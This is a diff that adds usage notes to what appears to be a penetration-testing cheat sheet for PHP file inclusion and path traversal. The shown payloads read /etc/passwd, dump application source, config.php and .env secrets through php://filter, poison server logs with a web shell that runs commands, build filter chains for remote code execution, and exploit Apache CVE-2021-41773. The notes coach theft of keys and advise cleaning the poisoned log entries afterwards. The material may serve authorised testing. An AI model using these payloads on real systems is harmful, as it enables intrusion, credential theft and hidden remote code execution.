@@ -6,6 +6,7 @@
 ---
 
 ## 1. Confirm traversal (depth-sweep)
+*What & when:* your first move — write directions-to-anywhere into the blank and confirm you can walk out of the app's folder. Sweep the `../` count because you don't know how deep the script lives; over-shooting is harmless. A `root:...:0:0:` / `[fonts]` hit proves the primitive — but it's only proof, not the finding.
 
 ```
 ../etc/passwd
@@ -54,6 +55,7 @@ images/../../../../etc/passwd%00
 ```
 
 ## 5. PHP wrappers — source & secret disclosure (Guide §9/§10)
+*What & when:* the fastest high-value win on PHP. `php://filter/convert.base64-encode/resource=` fetches a file *encoded* so the server shows you its source instead of running it — steal `config.php`/`.env`/keys even from a show-only sink and even past a forced `.php` suffix. Walk the app: dump index.php, read its includes, dump each.
 
 ```
 php://filter/convert.base64-encode/resource=index.php          # dump source as base64 (decode locally)
@@ -78,6 +80,7 @@ python3 poc/phpfilter_dump.py -u "https://target/?page=PHP" -r config.php -r .en
 ```
 
 ## 6. LFI → RCE: log poisoning (Guide §11)
+*What & when:* the classic include→RCE when you can reach a readable log. Put PHP in a field the server logs verbatim (User-Agent / the request path), then include the log so the server runs it. Use the SSH `auth.log` / mail-log variants when the web log isn't reachable. Clean the poisoned entries after.
 
 ```
 # 1) poison a log (PHP in a logged field)
@@ -95,6 +98,7 @@ GET /<?php system($_GET['c']); ?> HTTP/1.1
 ```
 
 ## 7. LFI → RCE: php://filter chain (no file write) (Guide §12)
+*What & when:* the universal fallback — RCE with no log, no upload, no remote URLs. A generator stacks text transforms so the "file" that emerges *is* your PHP, which the include runs; nothing touches disk. Reach for this the moment an include sink has none of the other RCE paths available.
 
 ```bash
 # generate a WORKING chain (poc/filter_chain_rce.py drives synacktiv's generator; auto-detected or --generator <path>):
@@ -203,6 +207,7 @@ data://text/plain;base64,<b64 php>   php://input (POST body = php)   expect://id
 ```
 
 ## 10d. Server / infrastructure traversal payloads (guide §16.3)
+*What & when:* when the bug is in the web server/proxy itself, not the app — no vulnerable app parameter needed. Fingerprint the version first (Server header), then fire the matching payload: Apache 2.4.49/50 `.%2e/` for file-read/RCE, nginx `alias` off-by-slash for source outside the root. One-request server-level Criticals.
 ```
 # Apache 2.4.49 (CVE-2021-41773) / 2.4.50 (CVE-2021-42013) — file read (+ RCE if cgi-bin/mod_cgi enabled):
 GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
